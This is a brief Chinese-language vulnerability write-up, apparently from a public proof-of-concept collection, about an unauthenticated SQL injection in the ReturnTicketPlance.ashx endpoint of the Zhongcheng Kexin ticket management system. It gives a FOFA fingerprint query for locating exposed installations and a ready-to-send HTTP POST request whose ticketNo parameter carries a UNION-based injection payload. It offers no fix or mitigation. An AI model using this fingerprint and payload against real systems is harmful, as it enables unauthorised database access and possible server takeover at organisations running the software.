# 中成科信票务管理系统ReturnTicketPlance.ashx存在SQL注入

中成科信票务管理系统 ReturnTicketPlance.ashx 接口处存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

## fofa

```yaml
icon_hash="1632964065" || icon_hash="-2142050529"
```

## poc

```javascript
POST /SystemManager/TicketSystem/ReturnTicketPlance.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: close

Method=GetCheckInDetail&ticketNo='%20UNION%20ALL%20SELECT%20NULL,CHAR(113)+CHAR(106)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(74)+CHAR(79)+CHAR(112)+CHAR(87)+CHAR(122)+CHAR(103)+CHAR(66)+CHAR(87)+CHAR(118)+CHAR(107)+CHAR(77)+CHAR(103)+CHAR(121)+CHAR(119)+CHAR(87)+CHAR(69)+CHAR(102)+CHAR(68)+CHAR(112)+CHAR(105)+CHAR(97)+CHAR(75)+CHAR(105)+CHAR(77)+CHAR(106)+CHAR(66)+CHAR(73)+CHAR(102)+CHAR(122)+CHAR(78)+CHAR(80)+CHAR(81)+CHAR(83)+CHAR(66)+CHAR(71)+CHAR(102)+CHAR(73)+CHAR(74)+CHAR(80)+CHAR(65)+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(122)+CHAR(113),NULL,NULL--%20BEsy
```

